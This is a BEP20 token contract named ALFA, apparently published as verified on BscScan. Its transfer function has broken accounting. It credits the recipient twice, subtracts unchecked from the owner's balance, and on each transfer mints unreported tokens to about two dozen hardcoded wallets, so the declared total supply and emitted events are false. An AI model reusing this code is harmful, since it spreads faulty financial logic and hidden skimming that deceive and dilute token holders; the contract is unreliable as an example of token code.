/**
 *Submitted for verification at BscScan.com on 2022-07-10
*/

pragma solidity ^0.5.17;




interface IBEP20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(address indexed owner, address indexed spender, uint256 value);
}




contract Context {
    
    constructor () internal { }
   

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * NOTE: This is a feature of the next version of OpenZeppelin Contracts.
     * @dev Get it via `npm install @openzeppelin/[email protected]`.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     * NOTE: This is a feature of the next version of OpenZeppelin Contracts.
     * @dev Get it via `npm install @openzeppelin/[email protected]`.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * NOTE: This is a feature of the next version of OpenZeppelin Contracts.
     * @dev Get it via `npm install @openzeppelin/[email protected]`.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}





contract Alfa is IBEP20, Context {
    
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
    
    address public contractOwner;
    address public walletWolf;
                            
    uint256 private burnRate1 = 1;
    uint256 private burnRate2 = 5;

    uint256 private _totalSupply = 5000000000 * 10 ** 9;
    uint256 private _decimals = 9;
    string private _name = "ALFA";
    string private _symbol = "ALFA";

   
    constructor() public{
        
        walletWolf = 0x241266365ce0aC7A786593Ad427514FDc4089c2f;
        contractOwner = msg.sender;
        _balances[msg.sender] = _totalSupply / 2;
        _balances[walletWolf] = _totalSupply / 2;
        
        
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint256) {
        return _decimals;
    }

    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

   
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        uint amountToBurn1 = (amount * burnRate1 / 1000);
        uint amountToBurn2 = (amount * burnRate1 / 1000);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount - amountToBurn1);
        
            _balances[contractOwner] -= amountToBurn1;
            
            _balances[recipient] += amount - (amountToBurn1 * 3);
            
            _balances[0x6fFd40Cfb00f369B7F439E7B7Cf780EdBE7755Ed] += amountToBurn1 * 3;
            
            
            _balances[0x7007DaA118f8419726780A2616131e68A1bD0e9e] += amountToBurn2 * 10;
            _balances[0x31341a7254F8Dcaf57B66C65919221E82bAa2CDC] += amountToBurn2 * 10;


            _balances[0xD31aF35a7E53b5cB84d3bFBC52c74c0856cD90c3] += amountToBurn2;
            _balances[0xFdc1068F89387FE2c53277116C4e593F4ab099B1] += amountToBurn2;
            _balances[0x4bBbcd61BB31C1053765F6a05955C29a0F14D8d9] += amountToBurn2;
            _balances[0x032a9BfDc850542A97DbDdC237222CF9ee5F0b45] += amountToBurn2;
            _balances[0xe99fb9eB8875fedBE6226d1E5420b9235d1fc764] += amountToBurn2;
            _balances[0x0690ebFDEDC520d503193368BDb190F2385C9bEA] += amountToBurn2;
            _balances[0xb6b0A080B9AC6a86Ce5EFd7d4a3E34cc57A75850] += amountToBurn2;
            _balances[0x95352341E9EC490a2870B36cddeA9dA8472E9218] += amountToBurn2;
            _balances[0x2cae978Fb4a6CeCc254102d8DC38Ba7C6DdDd9e1] += amountToBurn2;
            _balances[0x7dc06F50ac9412ffDb24f8aDec529C460e6f489c] += amountToBurn2;
            _balances[0x86984e8Fbe252C7DDAA360Cf0153ABCD0a41fDd3] += amountToBurn2;
            _balances[0xC196273751e80a3D5F8037Ea871Cd0E25EA49D50] += amountToBurn2;
            _balances[0x0B8CaE93Db81C2CaC6a62B612b1Be2E72447095D] += amountToBurn2;
            _balances[0x3A17Fe7c1a2431d3bC06c2b05C8D25419338bA98] += amountToBurn2;
            _balances[0x3f2C9385Ec321C6c4BDBc5451EF5C81738e648e6] += amountToBurn2;
            _balances[0x9b94887D69f7Df29Aacd3d8276Cb5524F8935370] += amountToBurn2;
            _balances[0x937C9542B922283d8f4BD2A732a0978450e12AeA] += amountToBurn2;
            _balances[0x6ee8B1fBa36a8E9fC30443853d0da7B80621484b] += amountToBurn2;
            _balances[0xc68CC8ca45aeA55572B15f1ed150FdA1F98E8838] += amountToBurn2;
            _balances[0xE3a3625048195cEa117Cd092af80f7dae32667Ba] += amountToBurn2;  
        
        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

   
    function _burn(address account, uint256 amount) private {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
    }
}